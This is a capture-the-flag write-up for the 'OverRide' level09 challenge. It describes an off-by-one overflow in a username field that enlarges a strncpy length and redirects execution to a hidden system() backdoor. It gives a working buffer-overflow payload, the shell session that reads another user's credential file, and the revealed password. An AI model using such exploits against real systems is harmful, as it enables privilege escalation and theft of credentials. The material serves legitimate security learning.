# Level09 Exploit

## 1. Initial Analysis

List the files in the directory:

```bash
level09@OverRide:~$ ls -l
total 16
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
```

The `level09` binary has the SUID bit set, which means it will run with the permissions of the owner of the file, in this case `end`.

## 2. Program Execution

Observe the program behavior:

```bash
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: cam
>: Welcome, cam
>: Msg @Unix-Dude
>>: hello
>: Msg sent!

```

We can see that the program waits for an username input, then prints a welcome message, and then waits for a message input and prints a message sent message.

## 3. Disassembling `main` Function

Use GDB to disassemble the `main` function:

```bash
level09@OverRide:~$ gdb ./level09
(gdb) disass main
```

You can convert the assembly code to C using the [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter) tool. You can find the converted code in [source.c](source.c).

We also use Ghidra to decompile the binary. You can find the decompiled code by Ghidra in [ghidra_level09.c](Ressources/ghidra_level09.c).

## 4. Program Analysis

The `main` function call `handle_msg`. This function declare a variable which is used in `set_username` and `set_msg` functions to set the username and message.
In the `set_username` function, we can see that the arg (`param_1` in ghidra file) is used like this:
`(param_1 + 0x8c)`
`0x8c` is `140` in decimal.
In the `set_msg` function, we can see that the arg (`param_1` in ghidra file) is used like this:
`strncpy(param_1,(char *)local_408,(long)*(int *)(param_1 + 0xb4));`
`0xb4` is `180` in decimal.
So we use this variable with his address (`strncpy(param_1`), with a address 140 bytes after, and with a address 180 bytes after.

His original address is used in `set_msg` function in the first arg of `strncpy` function (string argument), and his address + 180 bytes is used in the third arg of `strncpy` function (size argument).
His address + 140 is used in `set_username` function in the second arg of `strncpy` function (string argument).
So we can conclude that it's maybe a structure, with a string of 140 bytes, a string of 40 bytes and a integer.
The first string is the text message, the second string is the username and the integer is the length of the first string.

Maybe like this:
```c
struct s_msg {
    char text[140];
    char username[40];
    int len;
};
```
In the ghidra file, in `handle_msg` function, we can see:
```c
char local_c8 [140];
undefined8 local_3c;
undefined8 local_34;
undefined8 local_2c;
undefined8 local_24;
undefined8 local_1c;
undefined4 local_14;

local_3c = 0;
local_34 = 0;
local_2c = 0;
local_24 = 0;
local_1c = 0;
local_14 = 0x8c;
```
`0x8c` = 140 in decimal, and it's the last variable declared for this structure. So it's maybe the integer of the structure, the length of the first string.

In `set_username`, we can see that username input is copied in username string of the structure (40 bytes), and in `set_msg`, we can see that message input is copied in text string of the structure (140 bytes).

With Ghidra, we found a function `secret_backdoor` which is never called in the program.
```c
void secret_backdoor() {
    char buffer[128];

    fgets(buffer, 128, stdin);
    system(buffer);
}
```
This function reads 128 bytes from stdin and execute it with `system` function. We can use this function to execute a command.

## 4.1 Vulnerability

In the `set_username` function, we can see that the username input is copied in the username string of the structure with a `while` loop. The loop stops when the input is equal to `\n` or when the size of the input is greater than `0x29` (41 bytes).
But the size of the username string in the structure is 40 bytes.
So if we input a username with a size greater than 40 bytes, the 41th byte will overwrite the integer of the structure, which is the length of the first string. So we can rewrite the length of the first string with a value greater than 140.

In the `set_msg` function, the message input is copied in the text string of the structure with a `strncpy` function, with the size integer of the structure as the size argument. So if we rewrite the length of the first string with a value greater than 140, we can write more than 140 bytes in the text string of the structure, and overflow the text string.

## 5. Exploit

We want to execute the `secret_backdoor` function. For that, we will try to overflow the EIP with the address of the `secret_backdoor` function.

### 5.1 Find the secret_backdoor Address

```bash
level09@OverRide:~$ gdb ./level09
(gdb) break main
Breakpoint 1 at 0xaac
(gdb) run
Starting program: /home/users/level09/level09 

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) disass secret_backdoor
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:	push   %rbp
   0x000055555555488d <+1>:	mov    %rsp,%rbp
   0x0000555555554890 <+4>:	add    $0xffffffffffffff80,%rsp
   0x0000555555554894 <+8>:	mov    0x20171d(%rip),%rax        # 0x555555755fb8
   0x000055555555489b <+15>:	mov    (%rax),%rax
   0x000055555555489e <+18>:	mov    %rax,%rdx
   0x00005555555548a1 <+21>:	lea    -0x80(%rbp),%rax
   0x00005555555548a5 <+25>:	mov    $0x80,%esi
   0x00005555555548aa <+30>:	mov    %rax,%rdi
   0x00005555555548ad <+33>:	callq  0x555555554770 <fgets@plt>
   0x00005555555548b2 <+38>:	lea    -0x80(%rbp),%rax
   0x00005555555548b6 <+42>:	mov    %rax,%rdi
   0x00005555555548b9 <+45>:	callq  0x555555554740 <system@plt>
   0x00005555555548be <+50>:	leaveq 
   0x00005555555548bf <+51>:	retq   
End of assembler dump.
```

The address of the `secret_backdoor` function is `0x000055555555488c`.

### 5.2. Find the Offset

We overflow the size integer of the structure with one byte.
The size integer is defined at the value `0x8c`. An integer is 4 bytes, so `len = 0x0000008c`.
If we overflow the first byte of the integer with `0xff`, the new value of the integer will be `0x000000ff = 255`.
So we can search the offset until 255.

The structure is defined like this:
```c
struct s_msg {
    char text[140];
    char username[40];
    int len;
} t_msg;
```
And `text` is used in:
```c
strncpy(msg->text, local_buffer, strlen(msg->len));
```
If we want overflow here, we need to fill the `text`, the `username` and the `len`.
So 140 bytes for the text, 40 bytes for the username and 4 bytes for the len.
So we can search the offset after 184 bytes.

The offset is between 184 and 255.

### 5.3. Exploit

For the username input, we will use 40 bytes of `a` and 1 byte of `0xff` to overflow the integer of the structure.
For the message input, we will use `X` bytes of `0x90` to fill the text and 4 bytes of the address of the `secret_backdoor` function.
The address of the `secret_backdoor` function is `0x000055555555488c`, in little-endian it is `\x8c\x48\x55\x55\x55\x55\x00\x00`.
```bash
python -c "print 40 * 'a' + '\xff' + '\n' + '\x90' * X + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh' + '\n'" > /tmp/cam
```

We know that `X` is between 184 and 255. So we will try with all numbers between 184 and 255.
And we found that the offset is 200

```bash
level09@OverRide:~$ python -c "print 40 * 'a' + '\xff' + '\n' + '\x90' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh' + '\n'" > /tmp/cam
level09@OverRide:~$ (cat /tmp/cam; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

Congratulations! You have successfully exploited the `level09` binary and found the password for `end`.

```bash
level09@OverRide:~$ su end
Password: 
end@OverRide:~$ ls
end
end@OverRide:~$ cat end
GG !
end@OverRide:~$ ./end
```